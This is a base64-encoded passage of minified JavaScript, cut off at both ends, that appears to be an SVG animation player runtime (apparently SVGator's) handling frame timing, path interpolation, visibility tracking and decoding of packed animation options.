JvYmplY3QiOmlmKChmPUsoaSxYKHMuaSkscy5mKSkmJiJmdW5jdGlvbiI9PXR5cGVvZiBzLnUpcmV0dXJuIHMudShuLGYscixhLHQpfXJldHVybiBmP2Z1bmN0aW9uKHQsbixlKXtpZihhcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXSYmYXJndW1lbnRzWzNdKXJldHVybiB0IGluc3RhbmNlb2YgVz9mdW5jdGlvbihyKXtyZXR1cm4gdC5zdHlsZShuLGUocikpfTpmdW5jdGlvbihyKXtyZXR1cm4gdC5zdHlsZVtuXT1lKHIpfTtpZihBcnJheS5pc0FycmF5KG4pKXt2YXIgcj1uLmxlbmd0aDtyZXR1cm4gZnVuY3Rpb24oaSl7dmFyIHU9ZShpKTtpZihudWxsPT11KWZvcih2YXIgbz0wO288cjtvKyspdFtvXS5yZW1vdmVBdHRyaWJ1dGUobik7ZWxzZSBmb3IodmFyIGE9MDthPHI7YSsrKXRbYV0uc2V0QXR0cmlidXRlKG4sdSl9fXJldHVybiBmdW5jdGlvbihyKXt2YXIgaT1lKHIpO251bGw9PWk/dC5yZW1vdmVBdHRyaWJ1dGUobik6dC5zZXRBdHRyaWJ1dGUobixpKX19KG4scixmLGEpOm51bGx9ZnVuY3Rpb24gZXQodCxuLHIsaSl7aWYoIWl8fCJvYmplY3QiIT09ZShpKSlyZXR1cm4gbnVsbDt2YXIgdT1udWxsLG89bnVsbDtyZXR1cm4gQXJyYXkuaXNBcnJheShpKT9vPWZ1bmN0aW9uKHQpe2lmKCF0fHwhdC5sZW5ndGgpcmV0dXJuIG51bGw7Zm9yKHZhciBuPTA7bjx0Lmxlbmd0aDtuKyspdFtuXS5lJiYodFtuXS5lPUoodFtuXS5lKSk7cmV0dXJuIHQuc29ydCh0dCl9KGkpOihvPWkua2V5cyx1PWkuZGF0YXx8bnVsbCksbz9udCh0LG4scixvLHUpOm51bGx9ZnVuY3Rpb24gcnQodCxuLGUpe2lmKCFlKXJldHVybiBudWxsO3ZhciByPVtdO2Zvcih2YXIgaSBpbiBlKWlmKGUuaGFzT3duUHJvcGVydHkoaSkpe3ZhciB1PWV0KHQsbixpLGVbaV0pO3UmJnIucHVzaCh1KX1yZXR1cm4gci5sZW5ndGg/cjpudWxsfWZ1bmN0aW9uIGl0KHQsbil7aWYoIW4uZHVyYXRpb258fG4uZHVyYXRpb248MClyZXR1cm4gbnVsbDt2YXIgZT1mdW5jdGlvbih0LG4pe2lmKCFuKXJldHVybiBudWxsO3ZhciBlPVtdO2lmKEFycmF5LmlzQXJyYXkobikpZm9yKHZhciByPW4ubGVuZ3RoLGk9MDtpPHI7aSsrKXt2YXIgdT1uW2ldO2lmKDI9PT11Lmxlbmd0aCl7dmFyIG89bnVsbDtpZigic3RyaW5nIj09dHlwZW9mIHVbMF0pbz10LmdldEVsZW1lbnRCeUlkKHVbMF0pO2Vsc2UgaWYoQXJyYXkuaXNBcnJheSh1WzBdKSl7bz1bXTtmb3IodmFyIGE9MDthPHVbMF0ubGVuZ3RoO2ErKylpZigic3RyaW5nIj09dHlwZW9mIHVbMF1bYV0pe3ZhciBsPXQuZ2V0RWxlbWVudEJ5SWQodVswXVthXSk7bCYmby5wdXNoKGwpfW89by5sZW5ndGg/MT09PW8ubGVuZ3RoP29bMF06bmV3IFcobyk6bnVsbH1pZihvKXt2YXIgcz1ydCh0LG8sdVsxXSk7cyYmKGU9ZS5jb25jYXQocykpfX19ZWxzZSBmb3IodmFyIGYgaW4gbilpZihuLmhhc093blByb3BlcnR5KGYpKXt2YXIgYz10LmdldEVsZW1lbnRCeUlkKGYpO2lmKGMpe3ZhciBoPXJ0KHQsYyxuW2ZdKTtoJiYoZT1lLmNvbmNhdChoKSl9fXJldHVybiBlLmxlbmd0aD9lOm51bGx9KHQsbi5lbGVtZW50cyk7cmV0dXJuIGU/ZnVuY3Rpb24odCxuKXt2YXIgZT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06MS8wLHI9YXJndW1lbnRzLmxlbmd0aD4zJiZ2b2lkIDAhPT1hcmd1bWVudHNbM10/YXJndW1lbnRzWzNdOjEsaT1hcmd1bWVudHMubGVuZ3RoPjQmJnZvaWQgMCE9PWFyZ3VtZW50c1s0XSYmYXJndW1lbnRzWzRdLHU9YXJndW1lbnRzLmxlbmd0aD41JiZ2b2lkIDAhPT1hcmd1bWVudHNbNV0/YXJndW1lbnRzWzVdOjEsbz10Lmxlbmd0aCxhPXI+MD9uOjA7aSYmZSUyPT0wJiYoYT1uLWEpO3ZhciBsPW51bGw7cmV0dXJuIGZ1bmN0aW9uKHMsZil7dmFyIGM9cyVuLGg9MSsocy1jKS9uO2YqPXIsaSYmaCUyPT0wJiYoZj0tZik7dmFyIHY9ITE7aWYoaD5lKWM9YSx2PSEwLC0xPT09dSYmKGM9cj4wPzA6bik7ZWxzZSBpZihmPDAmJihjPW4tYyksYz09PWwpcmV0dXJuITE7bD1jO2Zvcih2YXIgZD0wO2Q8bztkKyspdFtkXShjKTtyZXR1cm4gdn19KGUsbi5kdXJhdGlvbixuLml0ZXJhdGlvbnN8fDEvMCxuLmRpcmVjdGlvbnx8MSwhIW4uYWx0ZXJuYXRlLG4uZmlsbHx8MSk6bnVsbH1mdW5jdGlvbiB1dCh0KXtyZXR1cm4rKCIweCIrKHQucmVwbGFjZSgvW14wLTlhLWZBLUZdKy9nLCIiKXx8MjcpKX1mdW5jdGlvbiBvdCh0LG4sZSl7cmV0dXJuIXR8fCFlfHxuPnQubGVuZ3RoP3Q6dC5zdWJzdHJpbmcoMCxuKStvdCh0LnN1YnN0cmluZyhuKzEpLGUsZSl9ZnVuY3Rpb24gYXQodCl7dmFyIG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOjI3O3JldHVybiF0fHx0JW4/dCVuOmF0KHQvbixuKX1mdW5jdGlvbiBsdCh0LG4sZSl7aWYodCYmdC5sZW5ndGgpe3ZhciByPXV0KGUpLGk9dXQobiksdT1hdChyKSs1LG89b3QodCxhdChyLDUpLHUpO3JldHVybiBvPW8ucmVwbGFjZSgvXHg3YyQvZywiPT0iKS5yZXBsYWNlKC9ceDJmJC9nLCI9Iiksbz1mdW5jdGlvbih0LG4sZSl7dmFyIHI9KygiMHgiK3Quc3Vic3RyaW5nKDAsNCkpO3Q9dC5zdWJzdHJpbmcoNCk7Zm9yKHZhciBpPW4lcitlJTI3LHU9W10sbz0wO288dC5sZW5ndGg7bys9MilpZigifCIhPT10W29dKXt2YXIgYT0rKCIweCIrdFtvXSt0W28rMV0pLWk7dS5wdXNoKGEpfWVsc2V7dmFyIGw9KygiMHgiK3Quc3Vic3RyaW5nKG8rMSxvKzErNCkpLWk7bys9Myx1LnB1c2gobCl9cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUuYXBwbHkoU3RyaW5nLHUpfShvPShvPWF0b2IobykpLnJlcGxhY2UoL1tceDQxLVx4NUFdL2csIiIpLGksciksbz1KU09OLnBhcnNlKG8pfX1OdW1iZXIuaXNJbnRlZ2VyfHwoTnVtYmVyLmlzSW50ZWdlcj1mdW5jdGlvbih0KXtyZXR1cm4ibnVtYmVyIj09dHlwZW9mIHQmJmlzRmluaXRlKHQpJiZNYXRoLmZsb29yKHQpPT09dH0pLE51bWJlci5FUFNJTE9OfHwoTnVtYmVyLkVQU0lMT049MjIyMDQ0NjA0OTI1MDMxM2UtMzEpO3ZhciBzdD1mdW5jdGlvbigpe2Z1bmN0aW9uIHQobixlKXt2YXIgaT1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06e307cih0aGlzLHQpLHRoaXMuX2lkPTAsdGhpcy5fcnVubmluZz0hMSx0aGlzLl9yb2xsaW5nQmFjaz0hMSx0aGlzLl9hbmltYXRpb25zPW4sdGhpcy5kdXJhdGlvbj1lLmR1cmF0aW9uLHRoaXMuYWx0ZXJuYXRlPWUuYWx0ZXJuYXRlLHRoaXMuZmlsbD1lLmZpbGwsdGhpcy5pdGVyYXRpb25zPWUuaXRlcmF0aW9ucyx0aGlzLmRpcmVjdGlvbj1pLmRpcmVjdGlvbnx8MSx0aGlzLnNwZWVkPWkuc3BlZWR8fDEsdGhpcy5mcHM9aS5mcHN8fDEwMCx0aGlzLm9mZnNldD1pLm9mZnNldHx8MCx0aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQ9MH1yZXR1cm4gdSh0LFt7a2V5OiJfcm9sbGJhY2siLHZhbHVlOmZ1bmN0aW9uKCl7dmFyIHQ9dGhpcyxuPTEvMCxlPW51bGw7dGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PXRoaXMub2Zmc2V0LHRoaXMuX3JvbGxpbmdCYWNrfHwodGhpcy5fcm9sbGluZ0JhY2s9ITAsdGhpcy5fcnVubmluZz0hMCk7dGhpcy5faWQ9d2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZSgoZnVuY3Rpb24gcihpKXtpZih0Ll9yb2xsaW5nQmFjayl7bnVsbD09ZSYmKGU9aSk7dmFyIHU9aS1lLG89dC5yb2xsYmFja1N0YXJ0T2Zmc2V0LXUsYT1NYXRoLnJvdW5kKG8qdC5zcGVlZCk7aWYoYT50LmR1cmF0aW9uJiZuIT0xLzApe3ZhciBsPSEhdC5hbHRlcm5hdGUmJmEvdC5kdXJhdGlvbiUyPjEscz1hJXQuZHVyYXRpb247YT0ocys9bD90LmR1cmF0aW9uOjApfHx0LmR1cmF0aW9ufXZhciBmPXQuZnBzPzFlMy90LmZwczowLGM9TWF0aC5tYXgoMCxhKTtpZihjPG4tZil7dC5vZmZzZXQ9YyxuPWM7Zm9yKHZhciBoPXQuX2FuaW1hdGlvbnMsdj1oLmxlbmd0aCxkPTA7ZDx2O2QrKyloW2RdKGMsdC5kaXJlY3Rpb24pfXZhciB5PSExO2lmKHQuaXRlcmF0aW9ucz4wJiYtMT09PXQuZmlsbCl7dmFyIGc9dC5pdGVyYXRpb25zKnQuZHVyYXRpb24scD1nPT1hO2E9cD8wOmEsdC5vZmZzZXQ9cD8wOnQub2Zmc2V0LHk9YT5nfWE+MCYmdC5vZmZzZXQ+PWEmJiF5P3QuX2lkPXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUocik6dC5zdG9wKCl9fSkpfX0se2tleToiX3N0YXJ0Iix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMsbj1hcmd1bWVudHMubGVuZ3RoPjAmJnZvaWQgMCE9PWFyZ3VtZW50c1swXT9hcmd1bWVudHNbMF06MCxlPS0xLzAscj1udWxsLGk9e30sdT1mdW5jdGlvbiB1KG8pe3QuX3J1bm5pbmc9ITAsbnVsbD09ciYmKHI9byk7dmFyIGE9TWF0aC5yb3VuZCgoby1yK24pKnQuc3BlZWQpLGw9dC5mcHM/MWUzL3QuZnBzOjA7aWYoYT5lK2wmJiF0Ll9yb2xsaW5nQmFjayl7dC5vZmZzZXQ9YSxlPWE7Zm9yKHZhciBzPXQuX2FuaW1hdGlvbnMsZj1zLmxlbmd0aCxjPTAsaD0wO2g8ZjtoKyspaVtoXT9jKys6KGlbaF09c1toXShhLHQuZGlyZWN0aW9uKSxpW2hdJiZjKyspO2lmKGM9PT1mKXJldHVybiB2b2lkIHQuX3N0b3AoKX10Ll9pZD13aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHUpfTt0aGlzLl9pZD13aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHUpfX0se2tleToiX3N0b3AiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5faWQmJndpbmRvdy5jYW5jZWxBbmltYXRpb25GcmFtZSh0aGlzLl9pZCksdGhpcy5fcnVubmluZz0hMSx0aGlzLl9yb2xsaW5nQmFjaz0hMX19LHtrZXk6InBsYXkiLHZhbHVlOmZ1bmN0aW9uKCl7IXRoaXMuX3JvbGxpbmdCYWNrJiZ0aGlzLl9ydW5uaW5nfHwodGhpcy5fcm9sbGluZ0JhY2s9ITEsdGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PnRoaXMuZHVyYXRpb24mJih0aGlzLm9mZnNldD10aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQtKHRoaXMucm9sbGJhY2tTdGFydE9mZnNldC10aGlzLm9mZnNldCkldGhpcy5kdXJhdGlvbix0aGlzLnJvbGxiYWNrU3RhcnRPZmZzZXQ9MCksdGhpcy5fc3RhcnQodGhpcy5vZmZzZXQpKX19LHtrZXk6InN0b3AiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5fc3RvcCgpLHRoaXMub2Zmc2V0PTAsdGhpcy5yb2xsYmFja1N0YXJ0T2Zmc2V0PTA7dmFyIHQ9dGhpcy5kaXJlY3Rpb24sbj10aGlzLl9hbmltYXRpb25zO3dpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKGZ1bmN0aW9uKCl7Zm9yKHZhciBlPTA7ZTxuLmxlbmd0aDtlKyspbltlXSgwLHQpfSkpfX0se2tleToicmVhY2hlZFRvRW5kIix2YWx1ZTpmdW5jdGlvbigpe3JldHVybiB0aGlzLml0ZXJhdGlvbnM+MCYmdGhpcy5vZmZzZXQ+PXRoaXMuaXRlcmF0aW9ucyp0aGlzLmR1cmF0aW9ufX0se2tleToicmVzdGFydCIsdmFsdWU6ZnVuY3Rpb24oKXt0aGlzLl9zdG9wKCksdGhpcy5vZmZzZXQ9MCx0aGlzLl9zdGFydCgpfX0se2tleToicGF1c2UiLHZhbHVlOmZ1bmN0aW9uKCl7dGhpcy5fc3RvcCgpfX0se2tleToicmV2ZXJzZSIsdmFsdWU6ZnVuY3Rpb24oKXt0aGlzLmRpcmVjdGlvbj0tdGhpcy5kaXJlY3Rpb259fV0sW3trZXk6ImJ1aWxkIix2YWx1ZTpmdW5jdGlvbihlLHIpe3JldHVybiBkZWxldGUgZS5hbmltYXRpb25TZXR0aW5ncyxlLm9wdGlvbnM9bHQoZS5vcHRpb25zLGUucm9vdCwiOTFjODBkNzciKSxlLmFuaW1hdGlvbnMubWFwKChmdW5jdGlvbih0KXt2YXIgcj1sdCh0LnMsZS5yb290LCI5MWM4MGQ3NyIpO2Zvcih2YXIgaSBpbiBkZWxldGUgdC5zLGUuYW5pbWF0aW9uU2V0dGluZ3N8fChlLmFuaW1hdGlvblNldHRpbmdzPW4oe30scikpLHIpci5oYXNPd25Qcm9wZXJ0eShpKSYmKHRbaV09cltpXSl9KSksKGU9ZnVuY3Rpb24odCxuKXtpZigkPW4sIXR8fCF0LnJvb3R8fCFBcnJheS5pc0FycmF5KHQuYW5pbWF0aW9ucykpcmV0dXJuIG51bGw7Zm9yKHZhciBlPWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJzdmciKSxyPSExLGk9MDtpPGUubGVuZ3RoO2krKylpZihlW2ldLmlkPT09dC5yb290JiYhZVtpXS5zdmdhdG9yQW5pbWF0aW9uKXsocj1lW2ldKS5zdmdhdG9yQW5pbWF0aW9uPSEwO2JyZWFrfWlmKCFyKXJldHVybiBudWxsO3ZhciB1PXQuYW5pbWF0aW9ucy5tYXAoKGZ1bmN0aW9uKHQpe3JldHVybiBpdChyLHQpfSkpLmZpbHRlcigoZnVuY3Rpb24odCl7cmV0dXJuISF0fSkpO3JldHVybiB1Lmxlbmd0aD97ZWxlbWVudDpyLGFuaW1hdGlvbnM6dSxhbmltYXRpb25TZXR0aW5nczp0LmFuaW1hdGlvblNldHRpbmdzLG9wdGlvbnM6dC5vcHRpb25zfHx2b2lkIDB9Om51bGx9KGUscikpP3tlbDplLmVsZW1lbnQsb3B0aW9uczplLm9wdGlvbnN8fHt9LHBsYXllcjpuZXcgdChlLmFuaW1hdGlvbnMsZS5hbmltYXRpb25TZXR0aW5ncyxlLm9wdGlvbnMpfTpudWxsfX0se2tleToicHVzaCIsdmFsdWU6ZnVuY3Rpb24odCl7cmV0dXJuIHRoaXMuYnVpbGQodCl9fSx7a2V5OiJpbml0Iix2YWx1ZTpmdW5jdGlvbigpe3ZhciB0PXRoaXMsbj13aW5kb3cuX19TVkdBVE9SX1BMQVlFUl9fJiZ3aW5kb3cuX19TVkdBVE9SX1BMQVlFUl9fWyI5MWM4MGQ3NyJdO0FycmF5LmlzQXJyYXkobikmJm4uc3BsaWNlKDApLmZvckVhY2goKGZ1bmN0aW9uKG4pe3JldHVybiB0LmJ1aWxkKG4pfSkpfX1dKSx0fSgpOyFmdW5jdGlvbigpe2Zvcih2YXIgdD0wLG49WyJtcyIsIm1veiIsIndlYmtpdCIsIm8iXSxlPTA7ZTxuLmxlbmd0aCYmIXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWU7KytlKXdpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWU9d2luZG93W25bZV0rIlJlcXVlc3RBbmltYXRpb25GcmFtZSJdLHdpbmRvdy5jYW5jZWxBbmltYXRpb25GcmFtZT13aW5kb3dbbltlXSsiQ2FuY2VsQW5pbWF0aW9uRnJhbWUiXXx8d2luZG93W25bZV0rIkNhbmNlbFJlcXVlc3RBbmltYXRpb25GcmFtZSJdO3dpbmRvdy5yZXF1ZXN0QW5pbWF0aW9uRnJhbWV8fCh3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lPWZ1bmN0aW9uKG4pe3ZhciBlPURhdGUubm93KCkscj1NYXRoLm1heCgwLDE2LShlLXQpKSxpPXdpbmRvdy5zZXRUaW1lb3V0KChmdW5jdGlvbigpe24oZStyKX0pLHIpO3JldHVybiB0PWUrcixpfSx3aW5kb3cuY2FuY2VsQW5pbWF0aW9uRnJhbWU9d2luZG93LmNsZWFyVGltZW91dCl9KCk7dmFyIGZ0PWZ1bmN0aW9uKHQsbil7dmFyIGU9ITEscj1udWxsO3JldHVybiBmdW5jdGlvbihpKXtlJiZjbGVhclRpbWVvdXQoZSksZT1zZXRUaW1lb3V0KChmdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbigpe2Zvcih2YXIgaT0wLHU9d2luZG93LmlubmVySGVpZ2h0LG89MCxhPXdpbmRvdy5pbm5lcldpZHRoLGw9dC5wYXJlbnROb2RlO2wgaW5zdGFuY2VvZiBFbGVtZW50Oyl7dmFyIHM9d2luZG93LmdldENvbXB1dGVkU3R5bGUobCk7aWYoInZpc2libGUiIT09cy5vdmVyZmxvd1l8fCJ2aXNpYmxlIiE9PXMub3ZlcmZsb3dYKXt2YXIgZj1sLmdldEJvdW5kaW5nQ2xpZW50UmVjdCgpOyJ2aXNpYmxlIiE9PXMub3ZlcmZsb3dZJiYoaT1NYXRoLm1heChpLGYudG9wKSx1PU1hdGgubWluKHUsZi5ib3R0b20pKSwidmlzaWJsZSIhPT1zLm92ZXJmbG93WCYmKG89TWF0aC5tYXgobyxmLmxlZnQpLGE9TWF0aC5taW4oYSxmLnJpZ2h0KSl9aWYobD09PWwucGFyZW50Tm9kZSlicmVhaztsPWwucGFyZW50Tm9kZX1lPSExO3ZhciBjPXQuZ2V0Qm91bmRpbmdDbGllbnRSZWN0KCksaD1NYXRoLm1pbihjLmhlaWdodCxNYXRoLm1heCgwLGktYy50b3ApKSx2PU1hdGgubWluKGMuaGVpZ2h0LE1hdGgubWF4KDAsYy5ib3R0b20tdSkpLGQ9TWF0aC5taW4oYy53aWR0aCxNYXRoLm1heCgwLG8tYy5sZWZ0KSkseT1NYXRoLm1pbihjLndpZHRoLE1hdGgubWF4KDAsYy5yaWdodC1hKSksZz0oYy5oZWlnaHQtaC12KS9jLmhlaWdodCxwPShjLndpZHRoLWQteSkvYy53aWR0aCxtPU1hdGgucm91bmQoZypwKjEwMCk7bnVsbCE9PXImJnI9PT1tfHwocj1tLG4obSkpfSgpfSksMTAwKX19LGN0PWZ1bmN0aW9uKCl7ZnVuY3Rpb24gdChuLGUsaSl7cih0aGlzLHQpLGU9TWF0aC5tYXgoMSxlfHwxKSxlPU1hdGgubWluKGUsMTAwKSx0aGlzLmVsPW4sdGhpcy5vblRyZXNob2xkQ2hhbmdlPWkmJmkuY2FsbD9pOmZ1bmN0aW9uKCl7fSx0aGlzLnRyZXNob2xkUGVyY2VudD1lfHwxLHRoaXMuY3VycmVudFZpc2liaWxpdHk9bnVsbCx0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yPWZ0KG4sdGhpcy5vblZpc2liaWxpdHlVcGRhdGUuYmluZCh0aGlzKSksdGhpcy5iaW5kU2Nyb2xsV2F0Y2hlcnMoKSx0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yKCl9cmV0dXJuIHUodCxbe2tleToiYmluZFNjcm9sbFdhdGNoZXJzIix2YWx1ZTpmdW5jdGlvbigpe2Zvcih2YXIgdD10aGlzLmVsLnBhcmVudE5vZGU7dCYmKHQuYWRkRXZlbnRMaXN0ZW5lcigic2Nyb2xsIix0aGlzLnZpc2liaWxpdHlDYWxjdWxhdG9yKSx0IT09dC5wYXJlbnROb2RlJiZ0IT09ZG9jdW1lbnQpOyl0PXQucGFyZW50Tm9kZX19LHtrZXk6Im9uVmlzaWJpbGl0eVVwZGF0ZSIsdmFsdWU6ZnVuY3Rpb24odCl7dmFyIG49dGhpcy5jdXJyZW50VmlzaWJpbGl0eT49dGhpcy50cmVzaG9sZFBlcmNlbnQsZT10Pj10aGlzLnRyZXNob2xkUGVyY2VudDtpZihudWxsPT09dGhpcy5jdXJyZW50VmlzaWJpbGl0eXx8biE9PWUpcmV0dXJuIHRoaXMuY3VycmVudFZpc2liaWxpdHk9dCx2b2lkIHRoaXMub25UcmVzaG9sZENoYW5nZShlKTt0aGlzLmN1cnJlbnRWaXNpYmlsaXR5PXR9fV0pLHR9KCk7ZnVuY3Rpb24gaHQodCl7cmV0dXJuIGcodCkrIiJ9ZnVuY3Rpb24gdnQodCl7dmFyIG49YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOiIgIjtyZXR1cm4gdCYmdC5sZW5ndGg/dC5tYXAoaHQpLmpvaW4obik6IiJ9ZnVuY3Rpb24gZHQodCl7cmV0dXJuIGh0KHQueCkrIiwiK2h0KHQueSl9ZnVuY3Rpb24geXQodCl7cmV0dXJuIHQ/bnVsbD09dC5hfHx0LmE+PTE/InJnYigiK3QucisiLCIrdC5nKyIsIit0LmIrIikiOiJyZ2JhKCIrdC5yKyIsIit0LmcrIiwiK3QuYisiLCIrdC5hKyIpIjoidHJhbnNwYXJlbnQifWZ1bmN0aW9uIGd0KHQpe3JldHVybiB0PyJ1cmwoIyIrdCsiKSI6Im5vbmUifXZhciBwdD17ZjpudWxsLGk6Vix1OmZ1bmN0aW9uKHQsbil7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciByPW4oZSk7dC5zZXRBdHRyaWJ1dGUoInJ4IixodChyLngpKSx0LnNldEF0dHJpYnV0ZSgicnkiLGh0KHIueSkpfX19LG10PXtmOm51bGwsaTpmdW5jdGlvbih0LG4sZSl7cmV0dXJuIDA9PT10P246MT09PXQ/ZTp7d2lkdGg6Rih0LG4ud2lkdGgsZS53aWR0aCksaGVpZ2h0OkYodCxuLmhlaWdodCxlLmhlaWdodCl9fSx1OmZ1bmN0aW9uKHQsbil7cmV0dXJuIGZ1bmN0aW9uKGUpe3ZhciByPW4oZSk7dC5zZXRBdHRyaWJ1dGUoIndpZHRoIixodChyLndpZHRoKSksdC5zZXRBdHRyaWJ1dGUoImhlaWdodCIsaHQoci5oZWlnaHQpKX19fTtPYmplY3QuZnJlZXplKHtNOjIsTDoyLFo6MCxIOjEsVjoxLEM6NixROjQsVDoyLFM6NCxBOjd9KTt2YXIgYnQ9e30sd3Q9bnVsbDtmdW5jdGlvbiBBdCh0KXt2YXIgbj1mdW5jdGlvbigpe2lmKHd0KXJldHVybiB3dDtpZigib2JqZWN0IiE9PSgidW5kZWZpbmVkIj09dHlwZW9mIGRvY3VtZW50PyJ1bmRlZmluZWQiOmUoZG9jdW1lbnQpKXx8IWRvY3VtZW50LmNyZWF0ZUVsZW1lbnROUylyZXR1cm57fTt2YXIgdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoImh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiwic3ZnIik7cmV0dXJuIHQmJnQuc3R5bGU/KHQuc3R5bGUucG9zaXRpb249ImFic29sdXRlIix0LnN0eWxlLm9wYWNpdHk9IjAuMDEiLHQuc3R5bGUuekluZGV4PSItOTk5OSIsdC5zdHlsZS5sZWZ0PSItOTk5OXB4Iix0LnN0eWxlLndpZHRoPSIxcHgiLHQuc3R5bGUuaGVpZ2h0PSIxcHgiLHd0PXtzdmc6dH0pOnt9fSgpLnN2ZztpZighbilyZXR1cm4gZnVuY3Rpb24odCl7cmV0dXJuIG51bGx9O3ZhciByPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnROUyhuLm5hbWVzcGFjZVVSSSwicGF0aCIpO3Iuc2V0QXR0cmlidXRlTlMobnVsbCwiZCIsdCksci5zZXRBdHRyaWJ1dGVOUyhudWxsLCJmaWxsIiwibm9uZSIpLHIuc2V0QXR0cmlidXRlTlMobnVsbCwic3Ryb2tlIiwibm9uZSIpLG4uYXBwZW5kQ2hpbGQocik7dmFyIGk9ci5nZXRUb3RhbExlbmd0aCgpO3JldHVybiBmdW5jdGlvbih0KXt2YXIgbj1yLmdldFBvaW50QXRMZW5ndGgoaSp0KTtyZXR1cm57eDpuLngseTpuLnl9fX1mdW5jdGlvbiB4dCh0KXtyZXR1cm4gYnRbdF0/YnRbdF06YnRbdF09QXQodCl9ZnVuY3Rpb24ga3QodCxuLGUscil7aWYoIXR8fCFyKXJldHVybiExO3ZhciBpPVsiTSIsdC54LHQueV07aWYobiYmZSYmKGkucHVzaCgiQyIpLGkucHVzaChuLngpLGkucHVzaChuLnkpLGkucHVzaChlLngpLGkucHVzaChlLnkpKSxuPyFlOmUpe3ZhciB1PW58fGU7aS5wdXNoKCJRIiksaS5wdXNoKHUueCksaS5wdXNoKHUueSl9cmV0dXJuIG58fGV8fGkucHVzaCgiTCIpLGkucHVzaChyLngpLGkucHVzaChyLnkpLGkuam9pbigiICIpfWZ1bmN0aW9uIF90KHQsbixlLHIpe3ZhciBpPWFyZ3VtZW50cy5sZW5ndGg+NCYmdm9pZCAwIT09YXJndW1lbnRzWzRdP2FyZ3VtZW50c1s0XToxLHU9a3QodCxuLGUsciksbz14dCh1KTt0cnl7cmV0dXJuIG8oaSl9Y2F0Y2godCl7cmV0dXJuIG51bGx9fWZ1bmN0aW9uIFN0KHQsbixlLHIpe3ZhciBpPTEtcjtyZXR1cm4gaSppKnQrMippKnIqbityKnIqZX1mdW5jdGlvbiBPdCh0LG4sZSxyKXtyZXR1cm4gMiooMS1yKSoobi10KSsyKnIqKGUtbil9ZnVuY3Rpb24gTXQodCxuLGUscil7dmFyIGk9YXJndW1lbnRzLmxlbmd0aD40JiZ2b2lkIDAhPT1hcmd1bWVudHNbNF0mJmFyZ3VtZW50c1s0XSx1PV90KHQsbixudWxsLGUscik7cmV0dXJuIHV8fCh1PXt4OlN0KHQueCxuLngsZS54LHIpLHk6U3QodC55LG4ueSxlLnkscil9KSxpJiYodS5hPUV0KHQsbixlLHIpKSx1fWZ1bmN0aW9uIEV0KHQsbixlLHIpe3JldHVybiBNYXRoLmF0YW4yKE90KHQueSxuLnksZS55LHIpLE90KHQueCxuLngsZS54LHIpKX1mdW5jdGlvbiBqdCh0LG4sZSxyLGkpe3ZhciB1PWkqaTtyZXR1cm4gaSp1KihyLXQrMyoobi1lKSkrMyp1Kih0K2UtMipuKSszKmkqKG4tdCkrdH1mdW5jdGlvbiBQdCh0LG4sZSxyLGkpe3ZhciB1PTEtaTtyZXR1cm4gMyoodSp1KihuLXQpKzIqdSppKihlLW4pK2kqaSooci1lKSl9ZnVuY3Rpb24gSXQodCxuLGUscixpKXt2YXIgdT1hcmd1bWVudHMubGVuZ3RoPjUmJnZvaWQgMCE9PWFyZ3VtZW50c1s1XSYmYXJndW1lbnRzWzVdLG89X3QodCxuLGUscixpKTtyZXR1cm4gb3x8KG89e3g6anQodC54LG4ueCxlLngsci54LGkpLHk6anQodC55LG4ueSxlLnksci55LGkpfSksdSYmKG8uYT1CdCh0LG4sZSxyLGkpKSxvfWZ1bmN0aW9uIEJ0KHQsbixlLHIsaSl7cmV0dXJuIE1hdGguYXRhbjIoUHQodC55LG4ueSxlLnksci55LGkpLFB0KHQueCxuLngsZS54LHIueCxpKSl9ZnVuY3Rpb24gUnQodCxuLGUpe3JldHVybiB0KyhuLXQpKmV9ZnVuY3Rpb24gVHQodCxuLGUpe3ZhciByPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdJiZhcmd1bWVudHNbM10saT17eDpSdCh0Lngsbi54LGUpLHk6UnQodC55LG4ueSxlKX07cmV0dXJuIHImJihpLmE9TnQodCxuKSksaX1mdW5jdGlvbiBOdCh0LG4pe3JldHVybiBNYXRoLmF0YW4yKG4ueS10Lnksbi54LXQueCl9ZnVuY3Rpb24gQ3QodCxuLGUpe3ZhciByPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdJiZhcmd1bWVudHNbM107aWYoTHQobikpe2lmKHF0KGUpKXJldHVybiBNdChuLGUuc3RhcnQsZSx0LHIpfWVsc2UgaWYoTHQoZSkpe2lmKG4uZW5kKXJldHVybiBNd